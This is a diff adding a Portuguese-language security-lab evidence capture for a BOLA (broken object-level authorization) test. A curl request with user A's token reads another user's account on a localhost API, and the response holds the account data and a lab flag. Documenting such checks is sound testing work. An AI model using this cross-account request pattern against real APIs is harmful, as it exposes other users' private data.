@@ -1,0 +1,26 @@
+# E7 — E7-01-bola: H1 — BOLA (restaurado)
+capturado_em : 2026-11-04T12:59:04.865Z
+duracao_ms   : 0
+expectativa  : Após desligar os 4 controles novamente: volta a 200 (estado vulnerável).
+
+$ curl -s -o NUL -w "%{http_code}" -H "Authorization: Bearer token-user-a-1001" http://127.0.0.1:35021/api/v1/accounts/1002
+
+>>> REQUISICAO
+GET /api/v1/accounts/1002 HTTP/1.1
+Host: 127.0.0.1:35021
+Authorization: Bearer token-user-a-1001
+
+<<< RESPOSTA
+HTTP/1.1 200 OK
+connection: keep-alive
+content-type: application/json; charset=utf-8
+date: Wed, 04 Nov 2026 12:59:04 GMT
+keep-alive: timeout=5
+transfer-encoding: chunked
+
+{
+  "accountId": "1002",
+  "owner": "bob@corp.lab",
+  "balanceUsd": 94500,
+  "bolaFlag": "LAB{BOLA_CROSS_ACCOUNT_EXPOSED}"
+}
